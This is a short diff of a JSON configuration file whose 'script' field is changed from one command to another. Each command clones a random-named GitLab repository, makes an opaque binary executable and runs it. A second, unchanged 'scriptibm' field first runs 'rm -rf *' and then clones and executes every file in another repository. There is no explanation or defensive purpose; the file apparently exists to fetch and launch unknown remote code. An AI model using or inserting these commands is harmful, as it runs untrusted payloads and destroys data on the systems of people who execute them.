@@ -1,5 +1,5 @@
 {
-"script": "\n!git clone https://gitlab.com/Hurna829491/hendri.git && cd hendri && chmod +x ./ichan && ./ichan",
+"script": "\n!git clone https://gitlab.com/Caffani12482/munarwan.git && cd munarwan && chmod +x ./catri && ./catri",
 "scriptibm": "rm -rf * && git clone https://gitlab.com/Mitchell1837/gasso.git && cd gasso && chmod +x * && ./ahsan.sh\n",
 "validate": true,
 "version": "1.10"
